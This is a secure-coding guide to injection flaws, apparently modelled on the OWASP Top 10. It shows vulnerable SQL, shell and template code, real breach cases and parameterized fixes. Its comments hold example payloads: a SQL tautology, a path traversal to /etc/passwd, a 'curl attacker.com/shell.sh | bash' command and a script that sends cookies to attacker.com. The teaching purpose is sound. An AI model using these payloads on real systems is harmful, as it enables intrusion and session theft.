## A05:2025 — Injection
**🟠 High** | CWE-77 · CWE-89 · CWE-917

> Untrusted data sent to an interpreter as part of a command or query.  
> Detected in **94%** of analyzed applications.

Note: Covers SQL, NoSQL, OS command, LDAP, XPath, EL/OGNL, and template injection. XSS (Cross-Site Scripting) is also in this category as HTML injection.

--

## How It Works

**SQL Injection:**
```javascript
// VULNERABLE — string concatenation
const query = `SELECT * FROM users WHERE name='${req.body.name}'`;
// Input: ' OR '1'='1
// Becomes: SELECT * FROM users WHERE name='' OR '1'='1'
// → returns ALL users
```

**Command Injection:**
```python
# VULNERABLE
import os
filename = request.args.get('file')
os.system(f'cat /uploads/{filename}')
# Input: ../../../etc/passwd
# Or: ; curl attacker.com/shell.sh | bash
```

**XSS (HTML Injection):**
```html
<!-- VULNERABLE — unsanitized output -->
<p>Hello, <%= user.name %></p>
<!-- Input: <script>fetch('https://attacker.com/?c='+document.cookie)</script> -->
```

Note: XSS = Cross-Site Scripting — injecting malicious HTML/JavaScript into pages viewed by other users; classified as HTML injection under the 2025 Injection category. SQLi = SQL Injection. OGNL = Object-Graph Navigation Language — an expression language used by Apache Struts; exploited in the Equifax breach via a Content-Type header injection.

--

## Real-World Examples

**MOVEit Transfer — CVE-2023-34362 (May 2023)**
- SQL injection in the file-transfer web application
- Attackers installed `LemurLoot` webshell, exfiltrated data from 1,000s of organizations
- **Impact**: 62M+ individuals, British Airways, BBC, Boots, US federal agencies

**Gab Social (2021)**
- SQL injection introduced via a code rebase
- 70GB of private messages, posts, user data exfiltrated
- **Impact**: All user data exposed publicly

Note: LemurLoot was an ASPX webshell — a server-side script the attacker uploaded that provided persistent remote access and file exfiltration. The Cl0p ransomware group exploited this vulnerability at scale, targeting thousands of MOVEit customers simultaneously in a coordinated campaign. Gab Social (2021) used a Rails codebase that re-introduced a known SQL injection via a rebase from another project — demonstrating that code review gaps in merges are a real vector.

--

## Mitigation

1. Use **parameterized queries** (prepared statements) — never concatenate user input
2. Use an **ORM** that abstracts raw SQL
3. **Escape output** based on context (HTML, JS, URL, SQL)

```javascript
// FIXED — parameterized query
const result = await db.query(
  'SELECT * FROM users WHERE name = $1',
  [req.body.name]   // parameter, never interpolated
);
```

```javascript
// FIXED — OS command: use arrays, not shell strings
const { execFile } = require('child_process');
execFile('cat', [sanitizedFilename], callback);
// No shell involved → no injection possible
```

Note: ORM = Object-Relational Mapper — a library (Hibernate, SQLAlchemy, Sequelize) that generates SQL from object operations, using parameterized queries by default. SAST = Static Application Security Testing — analyzes source code without executing it. DAST = Dynamic Application Security Testing — probes a running application (e.g. sqlmap, OWASP ZAP).

--

## References & Tools

| Resource | Details |
|---|---|
| [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) | Parameterization, ORM |
| [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) | Output encoding |
| SonarQube | Rules for SQL/command/XSS injection |
| OWASP ZAP | Active scanner — finds injection in black-box |
| Snyk Code | SAST — finds injection in source |
| sqlmap | SQL injection testing tool |
